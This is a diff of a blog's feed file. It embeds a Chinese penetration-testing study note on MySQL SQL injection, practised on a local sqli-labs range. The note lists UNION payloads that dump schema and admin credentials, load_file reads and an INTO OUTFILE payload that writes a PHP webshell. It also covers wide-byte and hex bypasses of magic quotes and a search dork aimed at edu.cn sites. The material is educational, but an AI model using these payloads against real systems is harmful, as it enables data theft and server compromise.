@@ -11,6 +11,18 @@
         <content type="html"><![CDATA[<h1 id="13、WEB漏洞-SQL注入之MYSQL注入"><a href="#13、WEB漏洞-SQL注入之MYSQL注入" class="headerlink" title="13、WEB漏洞-SQL注入之MYSQL注入"></a>13、WEB漏洞-SQL注入之MYSQL注入</h1><p> MYSQL 注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行 getshell  操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/Mysql%E6%B3%A8%E5%85%A52.png" alt="Mysql注入2"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#跨库查询及应用思路</span><br><span class="line">information_schema 表特性，记录库名，表名，列名对应表</span><br><span class="line"></span><br><span class="line">获取所有数据库名</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata </span><br><span class="line"></span><br><span class="line">查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()</span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line">跨库查列，，，</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line">查结果。。。</span><br><span class="line">?id=-1 union select 1,u,p from qqyw.admin</span><br><span class="line"> </span><br><span class="line">#猜解多个数据可以采用limit x,1 变动x猜解</span><br><span class="line">#文件读写操作</span><br><span class="line">路径获取常见方法</span><br><span class="line">load_file():读取函数</span><br><span class="line">into outfile或into dumpfile:导出函数</span><br><span class="line"></span><br><span class="line">报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</span><br><span class="line">windows：</span><br><span class="line">d:/wwwroot/blog/</span><br><span class="line">linux:</span><br><span class="line">/var/www/blog/</span><br><span class="line"></span><br><span class="line">常见读取文件列表：</span><br><span class="line"></span><br><span class="line">常见写入文件问题：魔术引号开关</span><br><span class="line">magic_quotes_gpc</span><br><span class="line">#魔术引号及常见防护</span><br><span class="line">十六进制编码</span><br><span class="line">#低版本注入配合读取或暴力</span><br><span class="line">5.0版本以下，跑字典。。</span><br><span class="line">字典或读取</span><br></pre></td></tr></table></figure><h1 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h1><h2 id="普通用户-及root用户操作权限"><a href="#普通用户-及root用户操作权限" class="headerlink" title="普通用户 及root用户操作权限"></a>普通用户 及root用户操作权限</h2><p><strong>root</strong>在MYSQL数据库中属于<strong>最高权限</strong>，除root之外其他都简称为为普通用户权限</p><p><strong>跨库是指由于权限高，root用户不止能够操作自己的数据库，还可以操作普通用户的数据库的行为</strong></p><p>举例：</p><p><strong>数据库A = 网站A = 数据库用户A 普通用户</strong></p><p><strong>数据库B = 网站B = 数据库用户B 普通用户</strong></p><p><strong>数据库C = 网站C = 数据库用户C root用户</strong></p><p>这里A、B只能操作自己的数据库，而C就可以除了能够操作自己的数据库，还可以操作A、B的数据库（跨库）</p><p>在安全测试的过程中，我们可以运用这种思想，通过获取最高权限后对其他关联数据库进行操作</p><p>举例：在同个目录下存在网站A和网站B（即在同一个服务器），对网站A进行安全测试没有发现漏洞，网站B存在SQL注入漏洞，我们就可以获取到网站B的数据库内容，如果网站B用户为root用户，我们就间接拿到网站A对应的数据库内容。</p><h2 id="高权限注入跨库查询操作测试"><a href="#高权限注入跨库查询操作测试" class="headerlink" title="高权限注入跨库查询操作测试"></a>高权限注入跨库查询操作测试</h2><p><strong>跨库查询及应用思路（查询是在sqlilabs网站进行）</strong></p><p><strong>information_schema</strong> 表特性，记录库名，表名，列名对应表</p><p><strong>获取所有数据库名：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><p><strong>获取指定 qqyw 数据库名下的表名信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘qqyw’</span><br></pre></td></tr></table></figure><p><strong>获取指定 qqyw 下的表名 admin 下的列名信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where tale_name=‘admin’ and table_schema=‘qqyw’（加上and后面的判断语句是为了保证查出来的字段名是对应表的，多个数据库命名为admin的表可能有多个）</span><br></pre></td></tr></table></figure><p><strong>获取指定 qqyw 下的 admin 数据</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,u,p,4 from qqyw.admin</span><br></pre></td></tr></table></figure><p>（这是sqlilabs网站进行查询，所在的数据库并不是 qqyw，所以我们需要通过qqyw.admin来指定）</p><h2 id="高权限注入文件读写操作测试"><a href="#高权限注入文件读写操作测试" class="headerlink" title="高权限注入文件读写操作测试"></a>高权限注入文件读写操作测试</h2><p>  load_file():读取文件函数</p><p><img src="https://i.loli.net/2021/09/18/3gnG8b4aeoPU7Wp.png" alt="image-20210808215157779"></p><p>  select into outfile或者into dumpfile:导出函数</p><p><img src="https://i.loli.net/2021/09/18/uOsDU6biBLCaczA.png" alt="image-20210808215025441"></p><p><strong>路径获取常见方法：</strong><br><strong>报错显示   (phpinfo.php)   ，遗留文件      ，漏洞报错，平台配置文件</strong></p><p><strong>报错显示</strong>：网站报错的时候会泄漏出自己的路径（扫描工具/手动探测）</p><p><strong>百度搜索</strong>：inurl：edu.cn warning （格式相同，改变inurl内容即可）也可以查到其他网站报错显示</p><p><img src="https://i.loli.net/2021/09/18/packKvBoedAhfRC.png" alt="image-20210808215850240"></p><p><strong>遗留文件</strong>：调试软件或者平台遗留下来的文件，经典的就是phpinfo.php(扫描工具可以扫到)</p><p><img src="https://i.loli.net/2021/09/18/Q9tbB2fVjczkKUw.png" alt="image-20210808220447783"></p><p><strong>漏洞报错</strong>：知道网站是用什么cms或者框架进行搭建的，用搜索引擎去找到对应的爆路径方式，比如phpcms 爆路径</p><p><strong>平台配置文件</strong>：结合前面的读取文件操作来读取搭建网站平台的配置文件，通过默认路径去尝试找到突破口，但如果更改了默认安装路径，也是很难进行（不怎么常用）</p><p><strong>爆破</strong>:什么信息都没办法获取到，我们运用一些常见固定的可能安装位置生成字典，对目标网站进行爆破<br>例如：<br>windows:d:/www/root/xiaodi8/<br>linux:/var/www/xiaodi8</p><p>  <strong>常见读取文件列表：（需得知网站绝对路径）</strong><br>union select 1,load_file(‘D:\phpmyadmin\dudu.txt’),3 </p><p><img src="https://i.loli.net/2021/09/18/SPue1wjXVLQcMJA.png" alt="请添加图片描述"></p><p>  常见写入文件问题：魔术引号开关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,&#x27;&lt;?php $eval($_POST[&#x27;dudu&#x27;]);?&gt;&#x27;,3 into outfile &#x27;D:\\www\\dudu.php&#x27;</span><br></pre></td></tr></table></figure><h2 id="魔术引号开启后相关操作测试"><a href="#魔术引号开启后相关操作测试" class="headerlink" title="魔术引号开启后相关操作测试"></a>魔术引号开启后相关操作测试</h2><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20210214211359956.png" alt="image-20210214211359956"></p><p>编码绕过-》16进制编码/宽字节注入</p><p><img src="https://i.loli.net/2021/09/18/uA6UriOVytbRzm1.png" alt="image-20210808231741119"></p><p><img src="https://i.loli.net/2021/09/18/87ebq3LRcMKkajd.png" alt="img"></p><p><img src="https://i.loli.net/2021/09/18/md2MqXWiaBHlQDU.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用GET，POST，cookie所接收的&#x27;单引号，&quot;双引号，\反斜线和NULL字符全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。</span><br><span class="line">编码或者宽字节进行绕过</span><br><span class="line"></span><br><span class="line">isset无法绕过   替换关键字</span><br><span class="line"></span><br><span class="line">在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句。 </span><br></pre></td></tr></table></figure><p>编码后不需要单引号，所以就绕过了</p><h2 id="相关自定义代码过滤操作演示"><a href="#相关自定义代码过滤操作演示" class="headerlink" title="相关自定义代码过滤操作演示"></a>相关自定义代码过滤操作演示</h2><p>int()</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20210301134412247.png" alt="image-20210301134412247"></p><p>自定义关键字:select</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20210301134438051.png" alt="image-20210301134438051"></p><p><img src="https://i.loli.net/2021/09/18/fRMJn1DtIzPbm24.png" alt="img"></p><p>waf软件：安全狗</p><h1 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h1><p><a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>]]></content>
       
       
+      <categories>
+          
+          <category> 学习笔记 </category>
+          
+          <category> 渗透测试 </category>
+          
+          <category> WEB漏洞 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
       
         <tags>
             
@@ -386,11 +398,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
@@ -417,11 +429,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
@@ -448,11 +460,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
@@ -479,11 +491,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
@@ -510,11 +522,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
@@ -541,11 +553,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
@@ -572,11 +584,11 @@
       
       <categories>
           
-          <category> CTF </category>
+          <category> 学习笔记 </category>
           
-          <category> Web </category>
+          <category> 漏洞靶场 </category>
           
-          <category> dvwa </category>
+          <category> DVWA </category>
           
       </categories>
       
